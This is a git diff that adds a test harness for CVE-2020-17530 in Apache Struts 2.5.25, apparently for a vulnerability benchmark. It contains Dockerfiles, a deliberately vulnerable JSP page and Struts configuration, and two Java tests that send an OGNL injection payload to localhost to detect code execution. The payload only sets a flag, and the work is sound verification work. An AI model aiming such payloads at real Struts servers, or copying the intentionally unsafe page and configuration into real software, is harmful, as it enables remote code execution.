diff --git a/.Dockerfile.backup b/.Dockerfile.backup
new file mode 100644
index 0000000..2b95c34
--- /dev/null
+++ b/.Dockerfile.backup
@@ -0,0 +1,17 @@
+FROM ubuntu:22.04
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt -y update
+RUN apt install -y curl unzip wget git build-essential
+RUN mkdir -p /java-env
+ENV WORKSPACE_BASE="/"
+COPY ./java-env/jdk1.8.0_202 $WORKSPACE_BASE/java-env/jdk1.8.0_202
+COPY ./java-env/apache-maven-3.5.0 $WORKSPACE_BASE/java-env/apache-maven-3.5.0
+ENV PATH=$PATH:$WORKSPACE_BASE/java-env/apache-maven-3.5.0/bin:$WORKSPACE_BASE/java-env/jdk1.8.0_202/bin
+ENV JAVA_HOME=$WORKSPACE_BASE/java-env/jdk1.8.0_202
+ENV PATH=$PATH:$JAVA_HOME/bin
+COPY ./project-sources/apache__struts_CVE-2020-17530_2.5.25 /project
+COPY ./resources/my-agent/target/agent-fat.jar /project/.agent-fat.jar
+ENV JAVA_TOOL_OPTIONS="-javaagent:/project/.agent-fat.jar"
+WORKDIR /project
+# Do not modify anything above this line
+RUN mvn clean package -B -V -e -Dfindbugs.skip -Dcheckstyle.skip -Dpmd.skip=true -Dspotbugs.skip -Denforcer.skip -Dmaven.javadoc.skip -DskipTests -Dmaven.test.skip.exec -Dlicense.skip=true -Drat.skip=true -Dspotless.check.skip=true -Dorg.slf4j.simpleLogger.log.org.apache.maven.cli.transfer.Slf4jMavenTransferListener=warn
diff --git a/.build_diff.patch b/.build_diff.patch
new file mode 100644
index 0000000..8b13789
--- /dev/null
+++ b/.build_diff.patch
@@ -0,0 +1 @@
+
diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 0000000..c7ac2f7
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,26 @@
+FROM ubuntu:22.04
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt -y update
+RUN apt install -y curl unzip wget git build-essential
+RUN mkdir -p /java-env
+ENV WORKSPACE_BASE="/"
+COPY ./java-env/jdk1.8.0_202 $WORKSPACE_BASE/java-env/jdk1.8.0_202
+COPY ./java-env/apache-maven-3.5.0 $WORKSPACE_BASE/java-env/apache-maven-3.5.0
+ENV PATH=$PATH:$WORKSPACE_BASE/java-env/apache-maven-3.5.0/bin:$WORKSPACE_BASE/java-env/jdk1.8.0_202/bin
+ENV JAVA_HOME=$WORKSPACE_BASE/java-env/jdk1.8.0_202
+ENV PATH=$PATH:$JAVA_HOME/bin
+COPY ./project-sources/apache__struts_CVE-2020-17530_2.5.25 /project
+COPY ./resources/my-agent/target/agent-fat.jar /project/.agent-fat.jar
+ENV JAVA_TOOL_OPTIONS="-javaagent:/project/.agent-fat.jar"
+WORKDIR /project
+# Do not modify anything above this line
+RUN mvn clean package -B -V -e -Dfindbugs.skip -Dcheckstyle.skip -Dpmd.skip=true -Dspotbugs.skip -Denforcer.skip -Dmaven.javadoc.skip -DskipTests -Dmaven.test.skip.exec -Dlicense.skip=true -Drat.skip=true -Dspotless.check.skip=true -Dorg.slf4j.simpleLogger.log.org.apache.maven.cli.transfer.Slf4jMavenTransferListener=warn
+
+# Install additional dependencies
+RUN apt-get update && apt-get install -y procps
+
+# Make the test script executable
+RUN chmod +x /project/test-vulnerability/run-test.sh
+
+# Run the vulnerability test
+CMD ["/bin/bash", "/project/test-vulnerability/run-test.sh"]
diff --git a/test-vulnerability/pom.xml b/test-vulnerability/pom.xml
new file mode 100644
index 0000000..3f2d49b
--- /dev/null
+++ b/test-vulnerability/pom.xml
@@ -0,0 +1,84 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+    <modelVersion>4.0.0</modelVersion>
+
+    <groupId>org.apache.struts</groupId>
+    <artifactId>struts2-vulnerability-test</artifactId>
+    <version>1.0.0</version>
+    <packaging>war</packaging>
+
+    <name>Struts2 Vulnerability Test</name>
+
+    <properties>
+        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
+        <maven.compiler.source>1.8</maven.compiler.source>
+        <maven.compiler.target>1.8</maven.compiler.target>
+    </properties>
+
+    <dependencies>
+        <!-- Struts 2 -->
+        <dependency>
+            <groupId>org.apache.struts</groupId>
+            <artifactId>struts2-core</artifactId>
+            <version>2.5.25</version>
+        </dependency>
+
+        <!-- Servlet API -->
+        <dependency>
+            <groupId>javax.servlet</groupId>
+            <artifactId>javax.servlet-api</artifactId>
+            <version>3.1.0</version>
+            <scope>provided</scope>
+        </dependency>
+
+        <!-- Embedded Jetty for testing -->
+        <dependency>
+            <groupId>org.eclipse.jetty</groupId>
+            <artifactId>jetty-server</artifactId>
+            <version>9.4.35.v20201120</version>
+            <scope>test</scope>
+        </dependency>
+        <dependency>
+            <groupId>org.eclipse.jetty</groupId>
+            <artifactId>jetty-webapp</artifactId>
+            <version>9.4.35.v20201120</version>
+            <scope>test</scope>
+        </dependency>
+    </dependencies>
+
+    <build>
+        <finalName>struts2-vulnerability-test</finalName>
+        <plugins>
+            <plugin>
+                <groupId>org.apache.maven.plugins</groupId>
+                <artifactId>maven-compiler-plugin</artifactId>
+                <version>3.8.1</version>
+                <configuration>
+                    <source>1.8</source>
+                    <target>1.8</target>
+                </configuration>
+            </plugin>
+            <plugin>
+                <groupId>org.apache.maven.plugins</groupId>
+                <artifactId>maven-war-plugin</artifactId>
+                <version>3.2.3</version>
+            </plugin>
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>3.0.0</version>
+                <executions>
+                    <execution>
+                        <goals>
+                            <goal>java</goal>
+                        </goals>
+                    </execution>
+                </executions>
+                <configuration>
+                    <mainClass>VulnerabilityTest</mainClass>
+                </configuration>
+            </plugin>
+        </plugins>
+    </build>
+</project>
diff --git a/test-vulnerability/src/main/java/org/apache/struts2/test/VulnerabilityTestAction.java b/test-vulnerability/src/main/java/org/apache/struts2/test/VulnerabilityTestAction.java
new file mode 100644
index 0000000..f47efe3
--- /dev/null
+++ b/test-vulnerability/src/main/java/org/apache/struts2/test/VulnerabilityTestAction.java
@@ -0,0 +1,37 @@
+package org.apache.struts2.test;
+
+import com.opensymphony.xwork2.ActionSupport;
+
+public class VulnerabilityTestAction extends ActionSupport {
+    private String userInput;
+    private String output;
+    private boolean executed = false;
+
+    public String execute() {
+        return SUCCESS;
+    }
+
+    public String getUserInput() {
+        return userInput;
+    }
+
+    public void setUserInput(String userInput) {
+        this.userInput = userInput;
+    }
+
+    public String getOutput() {
+        return output;
+    }
+
+    public void setOutput(String output) {
+        this.output = output;
+    }
+
+    public boolean isExecuted() {
+        return executed;
+    }
+
+    public void setExecuted(boolean executed) {
+        this.executed = executed;
+    }
+}
diff --git a/test-vulnerability/src/main/resources/struts.xml b/test-vulnerability/src/main/resources/struts.xml
new file mode 100644
index 0000000..de997a6
--- /dev/null
+++ b/test-vulnerability/src/main/resources/struts.xml
@@ -0,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE struts PUBLIC
+	"-//Apache Software Foundation//DTD Struts Configuration 2.5//EN"
+	"http://struts.apache.org/dtds/struts-2.5.dtd">
+
+<struts>
+    <constant name="struts.devMode" value="true" />
+    <constant name="struts.enable.DynamicMethodInvocation" value="true" />
+    <constant name="struts.custom.i18n.resources" value="globalMessages" />
+    <constant name="struts.action.extension" value="action,," />
+
+    <package name="test" extends="struts-default" namespace="/">
+        <action name="vulnerabilityTest" class="org.apache.struts2.test.VulnerabilityTestAction">
+            <result name="success">/WEB-INF/test.jsp</result>
+        </action>
+    </package>
+</struts>
diff --git a/test-vulnerability/src/main/webapp/WEB-INF/test.jsp b/test-vulnerability/src/main/webapp/WEB-INF/test.jsp
new file mode 100644
index 0000000..68a0f80
--- /dev/null
+++ b/test-vulnerability/src/main/webapp/WEB-INF/test.jsp
@@ -0,0 +1,22 @@
+<%@ page contentType="text/html; charset=UTF-8" %>
+<%@ taglib prefix="s" uri="/struts-tags" %>
+<html>
+<head>
+    <title>Vulnerability Test</title>
+</head>
+<body>
+    <h1>Vulnerability Test</h1>
+    
+    <s:form action="vulnerabilityTest">
+        <s:textfield name="userInput" label="Enter OGNL Expression" />
+        <s:submit value="Submit" />
+    </s:form>
+    
+    <!-- This is where the vulnerability is triggered -->
+    <s:textfield name="output" label="Output" title="${userInput}" />
+    
+    <div>
+        <p>Executed: <s:property value="executed" /></p>
+    </div>
+</body>
+</html>
\ No newline at end of file
diff --git a/test-vulnerability/src/main/webapp/WEB-INF/web.xml b/test-vulnerability/src/main/webapp/WEB-INF/web.xml
new file mode 100644
index 0000000..bd4216d
--- /dev/null
+++ b/test-vulnerability/src/main/webapp/WEB-INF/web.xml
@@ -0,0 +1,32 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<web-app id="WebApp_9" version="2.4"
+	xmlns="http://java.sun.com/xml/ns/j2ee" 
+	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
+	xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd">
+
+    <display-name>Struts Vulnerability Test</display-name>
+	
+    <filter>
+        <filter-name>struts-prepare</filter-name>
+        <filter-class>org.apache.struts2.dispatcher.filter.StrutsPrepareFilter</filter-class>
+    </filter>
+
+    <filter>
+        <filter-name>struts-execute</filter-name>
+        <filter-class>org.apache.struts2.dispatcher.filter.StrutsExecuteFilter</filter-class>
+    </filter>
+
+    <filter-mapping>
+        <filter-name>struts-prepare</filter-name>
+        <url-pattern>/*</url-pattern>
+    </filter-mapping>
+
+    <filter-mapping>
+        <filter-name>struts-execute</filter-name>
+        <url-pattern>/*</url-pattern>
+    </filter-mapping>
+
+    <welcome-file-list>
+        <welcome-file>index.jsp</welcome-file>
+    </welcome-file-list>
+</web-app>
diff --git a/test-vulnerability/src/main/webapp/index.jsp b/test-vulnerability/src/main/webapp/index.jsp
new file mode 100644
index 0000000..9579b7c
--- /dev/null
+++ b/test-vulnerability/src/main/webapp/index.jsp
@@ -0,0 +1,12 @@
+<%@ page contentType="text/html; charset=UTF-8" %>
+<%@ taglib prefix="s" uri="/struts-tags" %>
+<html>
+<head>
+    <title>Vulnerability Test</title>
+</head>
+<body>
+    <h1>Vulnerability Test</h1>
+    <p>Click the link below to test the vulnerability:</p>
+    <p><a href="<s:url action='vulnerabilityTest'/>">/vulnerabilityTest.action</a></p>
+</body>
+</html>
\ No newline at end of file
diff --git a/test-vulnerability/src/test/java/DirectVulnerabilityTest.java b/test-vulnerability/src/test/java/DirectVulnerabilityTest.java
new file mode 100644
index 0000000..d7f27dd
--- /dev/null
+++ b/test-vulnerability/src/test/java/DirectVulnerabilityTest.java
@@ -0,0 +1,241 @@
+import com.opensymphony.xwork2.ActionContext;
+import com.opensymphony.xwork2.util.ValueStack;
+import com.opensymphony.xwork2.util.ValueStackFactory;
+import org.apache.struts2.components.Component;
+import org.apache.struts2.components.UIBean;
+import org.apache.struts2.dispatcher.HttpParameters;
+import org.apache.struts2.dispatcher.mapper.ActionMapping;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.PrintWriter;
+import java.io.StringWriter;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class DirectVulnerabilityTest {
+    public static void main(String[] args) {
+        try {
+            System.out.println("Starting direct vulnerability test...");
+            
+            // Create a mock request with the malicious parameter
+            MockHttpServletRequest request = new MockHttpServletRequest();
+            request.addParameter("userInput", "%{(#context.get('com.opensymphony.xwork2.ActionContext.container').getInstance(@com.opensymphony.xwork2.ActionContext@class).getContext().getValueStack().findValue('top')).setExecuted(true)}");
+            
+            // Create a mock response
+            MockHttpServletResponse response = new MockHttpServletResponse();
+            
+            // Create a value stack
+            ActionContext context = ActionContext.getContext();
+            if (context == null) {
+                // Create a new context if none exists
+                context = new ActionContext(new HashMap<>());
+                ActionContext.setContext(context);
+            }
+            
+            ValueStack stack = context.getValueStack();
+            
+            // Create a test object with an 'executed' property
+            TestObject testObject = new TestObject();
+            stack.push(testObject);
+            
+            // Create a UIBean component (TextField)
+            TextField textField = new TextField(stack, request, response);
+            
+            // Set the title attribute to the user input (which contains the OGNL expression)
+            textField.setTitle(request.getParameter("userInput"));
+            
+            // Evaluate the component (this should trigger the vulnerability)
+            textField.evaluateParams();
+            
+            // Check if our code was executed (the 'executed' property was set to true)
+            if (testObject.isExecuted()) {
+                System.out.println("VULNERABILITY DETECTED: Remote code execution successful!");
+                System.exit(1); // Exit with error code to indicate vulnerability exists
+            } else {
+                System.out.println("No vulnerability detected. The code was not executed.");
+                System.exit(0); // Exit with success code to indicate no vulnerability
+            }
+            
+        } catch (Exception e) {
+            System.out.println("Error during vulnerability test: " + e.getMessage());
+            e.printStackTrace();
+            System.exit(1);
+        }
+    }
+    
+    // Simple test object with an 'executed' property
+    public static class TestObject {
+        private boolean executed = false;
+        
+        public boolean isExecuted() {
+            return executed;
+        }
+        
+        public void setExecuted(boolean executed) {
+            this.executed = executed;
+        }
+    }
+    
+    // Mock classes for testing
+    public static class TextField extends UIBean {
+        public TextField(ValueStack stack, HttpServletRequest request, HttpServletResponse response) {
+            super(stack, request, response);
+        }
+        
+        @Override
+        protected String getDefaultTemplate() {
+            return "textfield";
+        }
+    }
+    
+    public static class MockHttpServletRequest implements HttpServletRequest {
+        private Map<String, String> parameters = new HashMap<>();
+        
+        public void addParameter(String name, String value) {
+            parameters.put(name, value);
+        }
+        
+        public String getParameter(String name) {
+            return parameters.get(name);
+        }
+        
+        // Implement other methods with default implementations
+        // Only the methods used in the test need real implementations
+        public Map<String, String[]> getParameterMap() {
+            Map<String, String[]> result = new HashMap<>();
+            for (Map.Entry<String, String> entry : parameters.entrySet()) {
+                result.put(entry.getKey(), new String[] { entry.getValue() });
+            }
+            return result;
+        }
+        
+        // Default implementations for other methods
+        public String getAuthType() { return null; }
+        public String getContextPath() { return ""; }
+        public javax.servlet.http.Cookie[] getCookies() { return new javax.servlet.http.Cookie[0]; }
+        public long getDateHeader(String name) { return 0; }
+        public String getHeader(String name) { return null; }
+        public java.util.Enumeration<String> getHeaderNames() { return new java.util.Vector<String>().elements(); }
+        public java.util.Enumeration<String> getHeaders(String name) { return new java.util.Vector<String>().elements(); }
+        public int getIntHeader(String name) { return 0; }
+        public String getMethod() { return "GET"; }
+        public String getPathInfo() { return null; }
+        public String getPathTranslated() { return null; }
+        public String getQueryString() { return null; }
+        public String getRemoteUser() { return null; }
+        public String getRequestURI() { return "/test"; }
+        public StringBuffer getRequestURL() { return new StringBuffer("http://localhost/test"); }
+        public String getRequestedSessionId() { return null; }
+        public String getServletPath() { return "/test"; }
+        public javax.servlet.http.HttpSession getSession() { return null; }
+        public javax.servlet.http.HttpSession getSession(boolean create) { return null; }
+        public java.security.Principal getUserPrincipal() { return null; }
+        public boolean isRequestedSessionIdFromCookie() { return false; }
+        public boolean isRequestedSessionIdFromURL() { return false; }
+        public boolean isRequestedSessionIdFromUrl() { return false; }
+        public boolean isRequestedSessionIdValid() { return false; }
+        public boolean isUserInRole(String role) { return false; }
+        public java.util.Enumeration<String> getAttributeNames() { return new java.util.Vector<String>().elements(); }
+        public String getCharacterEncoding() { return "UTF-8"; }
+        public int getContentLength() { return 0; }
+        public long getContentLengthLong() { return 0; }
+        public String getContentType() { return null; }
+        public javax.servlet.ServletInputStream getInputStream() { return null; }
+        public String getLocalAddr() { return "127.0.0.1"; }
+        public String getLocalName() { return "localhost"; }
+        public int getLocalPort() { return 8080; }
+        public java.util.Locale getLocale() { return java.util.Locale.getDefault(); }
+        public java.util.Enumeration<java.util.Locale> getLocales() { return new java.util.Vector<java.util.Locale>().elements(); }
+        public String getProtocol() { return "HTTP/1.1"; }
+        public java.io.BufferedReader getReader() { return null; }
+        public String getRealPath(String path) { return path; }
+        public String getRemoteAddr() { return "127.0.0.1"; }
+        public String getRemoteHost() { return "localhost"; }
+        public int getRemotePort() { return 0; }
+        public javax.servlet.RequestDispatcher getRequestDispatcher(String path) { return null; }
+        public String getScheme() { return "http"; }
+        public String getServerName() { return "localhost"; }
+        public int getServerPort() { return 8080; }
+        public boolean isSecure() { return false; }
+        public void removeAttribute(String name) {}
+        public void setAttribute(String name, Object o) {}
+        public void setCharacterEncoding(String env) {}
+        public Object getAttribute(String name) { return null; }
+        public java.util.Enumeration<String> getParameterNames() {
+            return new java.util.Vector<String>(parameters.keySet()).elements();
+        }
+        public String[] getParameterValues(String name) {
+            String value = parameters.get(name);
+            return value != null ? new String[] { value } : null;
+        }
+        public javax.servlet.ServletContext getServletContext() { return null; }
+        public javax.servlet.AsyncContext startAsync() { return null; }
+        public javax.servlet.AsyncContext startAsync(javax.servlet.ServletRequest servletRequest, javax.servlet.ServletResponse servletResponse) { return null; }
+        public boolean isAsyncStarted() { return false; }
+        public boolean isAsyncSupported() { return false; }
+        public javax.servlet.AsyncContext getAsyncContext() { return null; }
+        public javax.servlet.DispatcherType getDispatcherType() { return javax.servlet.DispatcherType.REQUEST; }
+        public javax.servlet.http.Part getPart(String name) { return null; }
+        public java.util.Collection<javax.servlet.http.Part> getParts() { return new java.util.ArrayList<>(); }
+        public void logout() {}
+        public void login(String username, String password) {}
+        public boolean authenticate(HttpServletResponse response) { return false; }
+        public javax.servlet.http.HttpUpgradeHandler upgrade(Class<? extends javax.servlet.http.HttpUpgradeHandler> handlerClass) { return null; }
+        public long getRequestId() { return 0; }
+        public long getProtocolRequestId() { return 0; }
+        public String changeSessionId() { return null; }
+    }
+    
+    public static class MockHttpServletResponse implements HttpServletResponse {
+        private StringWriter stringWriter = new StringWriter();
+        private PrintWriter writer = new PrintWriter(stringWriter);
+        
+        public PrintWriter getWriter() {
+            return writer;
+        }
+        
+        public String getOutput() {
+            return stringWriter.toString();
+        }
+        
+        // Default implementations for other methods
+        public void addCookie(javax.servlet.http.Cookie cookie) {}
+        public boolean containsHeader(String name) { return false; }
+        public String encodeURL(String url) { return url; }
+        public String encodeRedirectURL(String url) { return url; }
+        public String encodeUrl(String url) { return url; }
+        public String encodeRedirectUrl(String url) { return url; }
+        public void sendError(int sc, String msg) {}
+        public void sendError(int sc) {}
+        public void sendRedirect(String location) {}
+        public void setDateHeader(String name, long date) {}
+        public void addDateHeader(String name, long date) {}
+        public void setHeader(String name, String value) {}
+        public void addHeader(String name, String value) {}
+        public void setIntHeader(String name, int value) {}
+        public void addIntHeader(String name, int value) {}
+        public void setStatus(int sc) {}
+        public void setStatus(int sc, String sm) {}
+        public int getStatus() { return 200; }
+        public String getHeader(String name) { return null; }
+        public java.util.Collection<String> getHeaders(String name) { return new java.util.ArrayList<>(); }
+        public java.util.Collection<String> getHeaderNames() { return new java.util.ArrayList<>(); }
+        public String getCharacterEncoding() { return "UTF-8"; }
+        public String getContentType() { return "text/html"; }
+        public javax.servlet.ServletOutputStream getOutputStream() { return null; }
+        public void setCharacterEncoding(String charset) {}
+        public void setContentLength(int len) {}
+        public void setContentLengthLong(long len) {}
+        public void setContentType(String type) {}
+        public void setBufferSize(int size) {}
+        public int getBufferSize() { return 0; }
+        public void flushBuffer() {}
+        public void resetBuffer() {}
+        public boolean isCommitted() { return false; }
+        public void reset() {}
+        public void setLocale(java.util.Locale loc) {}
+        public java.util.Locale getLocale() { return java.util.Locale.getDefault(); }
+    }
+}
diff --git a/test-vulnerability/src/test/java/VulnerabilityTest.java b/test-vulnerability/src/test/java/VulnerabilityTest.java
new file mode 100644
index 0000000..e7417d0
--- /dev/null
+++ b/test-vulnerability/src/test/java/VulnerabilityTest.java
@@ -0,0 +1,81 @@
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
+
+public class VulnerabilityTest {
+    public static void main(String[] args) {
+        try {
+            // Start the embedded Jetty server with our test application
+            System.out.println("Starting vulnerability test...");
+            
+            // Test the vulnerability with a malicious OGNL expression
+            // This OGNL expression will set the 'executed' property to true if executed
+            String maliciousInput = "%{(#context.get('com.opensymphony.xwork2.ActionContext.container')"
+                    + ".getInstance(@com.opensymphony.xwork2.ActionContext@class)"
+                    + ".getContext()"
+                    + ".getValueStack()"
+                    + ".findValue('top'))"
+                    + ".setExecuted(true)}";
+            
+            // URL for our test action
+            String url = "http://localhost:8080/vulnerabilityTest.action";
+            
+            // First request to get the form
+            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
+            conn.setRequestMethod("GET");
+            int responseCode = conn.getResponseCode();
+            
+            if (responseCode != 200) {
+                System.out.println("Failed to access the test page. Response code: " + responseCode);
+                System.exit(1);
+            }
+            
+            // Second request to submit the form with the malicious input
+            conn = (HttpURLConnection) new URL(url).openConnection();
+            conn.setRequestMethod("POST");
+            conn.setDoOutput(true);
+            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+            
+            String postData = "userInput=" + URLEncoder.encode(maliciousInput, "UTF-8");
+            
+            try (OutputStream os = conn.getOutputStream()) {
+                byte[] input = postData.getBytes(StandardCharsets.UTF_8);
+                os.write(input, 0, input.length);
+            }
+            
+            responseCode = conn.getResponseCode();
+            
+            if (responseCode != 200) {
+                System.out.println("Form submission failed. Response code: " + responseCode);
+                System.exit(1);
+            }
+            
+            // Read the response to check if our code was executed
+            StringBuilder response = new StringBuilder();
+            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
+                String responseLine;
+                while ((responseLine = br.readLine()) != null) {
+                    response.append(responseLine.trim());
+                }
+            }
+            
+            // Check if our code was executed (the 'executed' property was set to true)
+            if (response.toString().contains("Executed: true")) {
+                System.out.println("VULNERABILITY DETECTED: Remote code execution successful!");
+                System.exit(1); // Exit with error code to indicate vulnerability exists
+            } else {
+                System.out.println("No vulnerability detected. The code was not executed.");
+                System.exit(0); // Exit with success code to indicate no vulnerability
+            }
+            
+        } catch (Exception e) {
+            System.out.println("Error during vulnerability test: " + e.getMessage());
+            e.printStackTrace();
+            System.exit(1);
+        }
+    }
+}
